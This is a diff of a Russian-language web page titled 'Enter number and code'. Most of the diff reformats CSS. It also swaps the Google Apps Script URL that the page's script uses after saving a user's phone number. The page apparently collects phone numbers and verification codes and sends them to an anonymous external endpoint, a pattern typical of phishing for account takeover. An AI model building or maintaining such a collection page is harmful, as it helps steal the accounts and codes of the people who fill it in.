@@ -4,9 +4,25 @@
   <meta charset="UTF-8">
   <title>Ввод номера и кода</title>
   <style>
-    body { font-family: sans-serif; padding: 40px; background: #f2f2f2; }
-    .container { max-width: 400px; margin: auto; background: white; padding: 20px; border-radius: 10px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
-    input, button { margin: 10px 0; padding: 10px; width: 100%; font-size: 16px; }
+    body {
+      font-family: sans-serif;
+      padding: 40px;
+      background: #f2f2f2;
+    }
+    .container {
+      max-width: 400px;
+      margin: auto;
+      background: white;
+      padding: 20px;
+      border-radius: 10px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+    }
+    input, button {
+      margin: 10px 0;
+      padding: 10px;
+      width: 100%;
+      font-size: 16px;
+    }
   </style>
 </head>
 <body>
@@ -24,7 +40,7 @@
 
   <script>
     let savedPhone = '';
-    const url = 'https://script.google.com/macros/s/AKfycbydv5B2flWBRiz6ZNB1QqQ8VycHcJaCNthVE24sYcwN22snslTJJiHaLfoWa4peTqTl6g/exec';
+    const url = 'https://script.google.com/macros/s/AKfycbzNf1gOLPJXmzsBIuAumpGr-e1fWWwBykrti4w5IURBmMJhQcXZ4WJZ46K00dK2nGt9ow/exec';
 
     function savePhone() {
       savedPhone = document.getElementById('phone').value.trim();
